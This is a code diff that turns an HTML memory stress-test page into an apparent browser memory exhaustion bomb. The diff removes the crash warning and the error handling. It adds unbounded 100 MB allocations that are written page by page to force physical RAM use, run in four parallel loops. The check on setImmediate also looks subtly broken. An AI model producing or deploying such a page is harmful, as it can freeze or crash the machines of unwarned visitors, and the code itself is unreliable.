@@ -2,52 +2,43 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Memory Stress Test - Mega Nuke</title>
+    <title>No Limit</title>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: #ff4444; text-align: center; padding: 50px; }
-        #status { font-size: 2em; font-weight: bold; margin-top: 20px; }
-        .warning { color: #888; margin-bottom: 20px; }
+        body { background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
+        #log { padding: 20px; font-size: 1.2em; }
     </style>
 </head>
 <body>
-    <h1>SYSTEM STRESS TEST</h1>
-    <p class="warning">Warning: This will likely crash this tab or slow down your computer.</p>
-    <div id="status">Initializing...</div>
-
+    <div id="log">Force Committing RAM...</div>
     <script>
-        let vault = [];
-        let totalMB = 0;
-        const chunkSize = 50; // 50MB per burst
-        
-        function nuke() {
-            try {
-                // 1. Create a 50MB buffer
-                let buffer = new Uint8Array(1024 * 1024 * chunkSize);
+        const blocks = [];
+        const log = document.getElementById('log');
 
-                // 2. "Dirty" the memory so the OS can't ignore it
-                // We write random values every 4KB (page size) to ensure 
-                // every physical page of RAM is actually committed.
-                for (let i = 0; i < buffer.length; i += 4096) {
-                    buffer[i] = Math.floor(Math.random() * 256);
-                }
+        function heavyNuke() {
+            // Allocate 100MB chunks for faster impact
+            const size = 100 * 1024 * 1024; 
+            const buffer = new Uint8Array(size);
 
-                // 3. Store it in a global array so it's never garbage collected
-                vault.push(buffer);
-                
-                totalMB += chunkSize;
-                document.getElementById("status").textContent = `Allocated: ${totalMB} MB`;
-
-                // 4. Recursive call via requestAnimationFrame for max speed
-                requestAnimationFrame(nuke);
-                
-            } catch (e) {
-                document.getElementById("status").textContent = "CRASH: Limit Reached!";
-                console.error("The browser stopped the script: ", e);
+            // Write to every single page to force physical RAM mapping
+            // This is the "Mega Nuke" default behavior
+            for (let i = 0; i < buffer.length; i += 4096) {
+                buffer[i] = i % 255; 
             }
+
+            blocks.push(buffer);
+            
+            // Log to the UI without stopping
+            log.innerText = `Total Allocated: ${blocks.length * 100} MB`;
+
+            // Use a combination of methods to prevent the event loop from blocking
+            setTimeout(heavyNuke, 0);
+            setImmediate ? setImmediate(heavyNuke) : null;
         }
 
-        // Start the loop
-        nuke();
+        // Launch multiple "threads" of the nuke simultaneously
+        for(let i = 0; i < 4; i++) {
+            heavyNuke();
+        }
     </script>
 </body>
 </html>
